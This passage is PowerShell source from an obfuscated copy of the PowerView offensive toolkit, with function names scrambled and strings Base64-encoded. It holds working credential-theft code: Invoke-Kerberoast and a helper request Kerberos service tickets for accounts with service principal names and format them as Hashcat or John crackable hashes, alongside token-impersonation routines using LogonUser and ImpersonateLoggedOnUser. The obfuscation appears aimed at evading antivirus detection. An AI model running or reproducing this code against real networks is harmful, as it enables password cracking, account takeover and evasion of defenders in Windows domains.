                ${/===\__/==\/\/===} += ,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewBfAF8AXwAvAFwALwBcAC8APQA9AFwAXwAvAFwAXwBfAC8AfQBcAEkAUABDACQA')))
            }
        }
        else {
            ${/===\__/==\/\/===} += ,$Path
        }
        ForEach (${/=\_/==\/===\____} in ${/===\__/==\/\/===}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIAB1AG4AbQBvAHUAbgB0ADoAIAAkAHsALwA9AFwAXwAvAD0APQBcAC8APQA9AD0AXABfAF8AXwBfAH0A')))
            ${/\_____/=\__/==\_} = ${/=\_/========\/\/}::WNetCancelConnection2(${/=\_/==\/===\____}, 0, $True)
            if (${/\_____/=\__/==\_} -eq 0) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8ALwA9AD0AXAAvAD0APQA9AFwAXwBfAF8AXwB9ACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAB1AG0AbQBvAHUAbgB0AGUAZAA=')))
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting ${/=\_/==\/===\____} : $(([ComponentModel.Win32Exception]${/\_____/=\__/==\_}).Message)"
            }
        }
    }
}
function _/=\/=\/==\_/=\__/ {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        ${_/=\/=\_/=\/=\/\/=},
        [Switch]
        ${___/==\_/\/=\_/=\_}
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEA')))) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGkAZQB0AA==')))])) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBzACAAbgBvAHQAIABjAHUAcgByAGUAbgB0AGwAeQAgAGkAbgAgAGEAIABzAGkAbgBnAGwAZQAtAHQAaAByAGUAYQBkAGUAZAAgAGEAcABhAHIAdABtAGUAbgB0ACAAcwB0AGEAdABlACwAIAB0AG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAbQBhAHkAIABuAG8AdAAgAHcAbwByAGsALgA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        ${______/\__/\__/=\} = ${_/=\/=\_/=\/=\/\/=}
    }
    else {
        ${______/\__/\__/=\} = [IntPtr]::Zero
        ${/=\___/==\/=\___/} = $Credential.GetNetworkCredential()
        $UserDomain = ${/=\___/==\/=\___/}.Domain
        ${/=\/=\_/\_/\/\_/\} = ${/=\___/==\/=\___/}.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$(${/=\/=\_/\_/\/\_/\})"
        ${/\_____/=\__/==\_} = ${/\____/=\/\/=\/\_}::LogonUser(${/=\/=\_/\_/\/\_/\}, $UserDomain, ${/=\___/==\/=\___/}.Password, 9, 3, [ref]${______/\__/\__/=\});${___/\____/\_/====} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not ${/\_____/=\__/==\_}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] ${___/\____/\_/====}).Message)"
        }
    }
    ${/\_____/=\__/==\_} = ${/\____/=\/\/=\/\_}::ImpersonateLoggedOnUser(${______/\__/\__/=\})
    if (-not ${/\_____/=\__/==\_}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] ${___/\____/\_/====}).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAQQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAZQBkAA==')))
    ${______/\__/\__/=\}
}
function __/\/=\/\______/\/ {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${_/=\/=\_/=\/=\/\/=}
    )
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABSAGUAdgBlAHIAdABpAG4AZwAgAHQAbwBrAGUAbgAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABhAG4AZAAgAGMAbABvAHMAaQBuAGcAIABMAG8AZwBvAG4AVQBzAGUAcgAoACkAIAB0AG8AawBlAG4AIABoAGEAbgBkAGwAZQA=')))
        ${/\_____/=\__/==\_} = ${_/\_/=\/====\/\/=}::CloseHandle(${_/=\/=\_/=\/=\/\/=})
    }
    ${/\_____/=\__/==\_} = ${/\____/=\/\/=\/\_}::RevertToSelf();${___/\____/\_/====} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not ${/\_____/=\__/==\_}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] ${___/\____/\_/====}).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABUAG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAByAGUAdgBlAHIAdABlAGQA')))
}
function ___/=====\/=\__/\_ {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        ${_/===\/=\_/\_/\/==},
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))) })]
        [Object[]]
        ${__/====\_/==\_/=\/},
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBJAGQAZQBuAHQAaQB0AHkATQBvAGQAZQBsAA=='))))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
            ${/==\__/\_/=\/==\_} = ${__/====\_/==\_/=\/}
        }
        else {
            ${/==\__/\_/=\/==\_} = ${_/===\/=\_/\_/\/==}
        }
        ForEach ($Object in ${/==\__/\_/=\/==\_}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
                ${/==\__/\_/\/\_/\_} = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                ${__/\/\/=\_/=\/\_/} = $Object.DistinguishedName
            }
            else {
                ${/==\__/\_/\/\_/\_} = $Object
                $SamAccountName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                ${__/\/\/=\_/=\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            }
            if (${/==\__/\_/\/\_/\_} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${/==\__/\_/\/\_/\_} = ${/==\__/\_/\/\_/\_}[0]
            }
            try {
                ${_/=\__/\/\/=\_/\_} = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ${/==\__/\_/\/\_/\_}
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAUABOAFQAaQBjAGsAZQB0AF0AIABFAHIAcgBvAHIAIAByAGUAcQB1AGUAcwB0AGkAbgBnACAAdABpAGMAawBlAHQAIABmAG8AcgAgAFMAUABOACAAJwAkAHsALwA9AD0AXABfAF8ALwBcAF8ALwBcAC8AXABfAC8AXABfAH0AJwAgAGYAcgBvAG0AIAB1AHMAZQByACAAJwAkAHsAXwBfAC8AXAAvAFwALwA9AFwAXwAvAD0AXAAvAFwAXwAvAH0AJwAgADoAIAAkAF8A')))
            }
            if (${_/=\__/\/\/=\_/\_}) {
                ${/==\/\__/\/\/\_/=} = ${_/=\__/\/\/=\_/\_}.GetRequest()
            }
            if (${/==\/\__/\/\/\_/=}) {
                ${__/\/=\/\/\/==\__} = New-Object PSObject
                ${/===\_/===\/=\__/} = [System.BitConverter]::ToString(${/==\/\__/\/\/\_/=}) -replace '-'
                ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $SamAccountName
                ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${__/\/\/=\_/=\/\_/}
                ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))) ${_/=\__/\/\/=\_/\_}.ServicePrincipalName
                if(${/===\_/===\/=\__/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQAzADgAMgAuAC4ALgAuADMAMAA4ADIALgAuAC4ALgBBADAAMAAzADAAMgAwADEAKAA/ADwARQB0AHkAcABlAEwAZQBuAD4ALgAuACkAQQAxAC4AewAxACwANAB9AC4ALgAuAC4ALgAuAC4AQQAyADgAMgAoAD8APABDAGkAcABoAGUAcgBUAGUAeAB0AEwAZQBuAD4ALgAuAC4ALgApAC4ALgAuAC4ALgAuAC4ALgAoAD8APABEAGEAdABhAFQAbwBFAG4AZAA+AC4AKwApAA==')))) {
                    ${/=\__/\/==\/=\/\/} = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    ${___/=====\___/=\/} = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    ${/=\/\/\_/==\_/===} = $Matches.DataToEnd.Substring(0,${___/=====\___/=\/}*2)
                    if($Matches.DataToEnd.Substring(${___/=====\___/=\/}*2, 4) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQA0ADgAMgA=')))) {
                        Write-Warning "Error parsing ciphertext for the SPN  $(${_/=\__/\/\/=\_/\_}.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        ${_/\/\_/=====\/\__} = $null
                        ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString(${/==\/\__/\/\/\_/=}).Replace('-',''))
                    } else {
                        ${_/\/\_/=====\/\__} = "$(${/=\/\/\_/==\_/===}.Substring(0,32))`$$(${/=\/\/\_/==\_/===}.Substring(32))"
                        ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $(${_/=\__/\/\/=\_/\_}.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    ${_/\/\_/=====\/\__} = $null
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString(${/==\/\__/\/\/\_/=}).Replace('-',''))
                }
                if(${_/\/\_/=====\/\__}) {
                    if ($OutputFormat -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGgAbgA=')))) {
                        ${/==\____/=\/\____} = "`$krb5tgs`$$(${_/=\__/\/\/=\_/\_}.ServicePrincipalName):${_/\/\_/=====\/\__}"
                    }
                    else {
                        if (${__/\/\/=\_/=\/\_/} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))) {
                            $UserDomain = ${__/\/\/=\_/=\/\_/}.SubString(${__/\/\/=\_/=\/\_/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                        else {
                            $UserDomain = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                        }
                        ${/==\____/=\/\____} = "`$krb5tgs`$$(${/=\__/\/==\/=\/\/})`$*$SamAccountName`$$UserDomain`$$(${_/=\__/\/\/=\_/\_}.ServicePrincipalName)*`$${_/\/\_/=====\/\__}"
                    }
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABhAHMAaAA='))) ${/==\____/=\/\____}
                }
                ${__/\/=\/\/\/==\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAFAATgBUAGkAYwBrAGUAdAA='))))
                ${__/\/=\/\/\/==\__}
            }
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function Invoke-Kerberoast {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\/=\/==\/} = @{
            'SPN' = $True
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAcwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        __/\__/\/======\_/ @/=\___/=\/=\/==\/ | ? {$_.samaccountname -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA')))} | ___/=====\/=\__/\_ -OutputFormat $OutputFormat
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function Get-PathAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function ____/\___/===\___/ {
            [CmdletBinding()]
            Param(
                [Int]
                ${_/==\_/===\/\/=\/\}
            )
            ${___/=\/==\__/===\} = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBSAGUAYQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAbABvAHcAZQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMQAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAUwB5AHMAdABlAG0AUwBlAGMAdQByAGkAdAB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAxADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADgAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE8AdwBuAGUAcgA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADQAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAQQBDAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADIAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEEAdAB0AHIAaQBiAHUAdABlAHMA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAQwBoAGkAbABkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQAvAFQAcgBhAHYAZQByAHMAZQA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEUAeAB0AGUAbgBkAGUAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABFAHgAdABlAG4AZABlAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQARABhAHQAYQAvAEEAZABkAFMAdQBiAGQAaQByAGUAYwB0AG8AcgB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAYQB0AGEALwBBAGQAZABGAGkAbABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABEAGEAdABhAC8ATABpAHMAdABEAGkAcgBlAGMAdABvAHIAeQA=')))
            }
            ${_/==\/\/\_/\/\/=\} = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAZgAwADEAZgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AGwAbABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMwAwADEAYgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAHkA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAYQA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADEAOQBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAOAA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMQA2AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))
            }
            ${/=\___/\/=\_/=\/=} = @()
            ${/=\___/\/=\_/=\/=} += ${_/==\/\/\_/\/\/=\}.Keys | % {
                              if ((${_/==\_/===\/\/=\/\} -band $_) -eq $_) {
                                ${_/==\/\/\_/\/\/=\}[$_]
                                ${_/==\_/===\/\/=\/\} = ${_/==\_/===\/\/=\/\} -band (-not $_)
                              }
                            }
            ${/=\___/\/=\_/=\/=} += ${___/=\/==\__/===\}.Keys | ? { ${_/==\_/===\/\/=\/\} -band $_ } | % { ${___/=\/==\__/===\}[$_] }
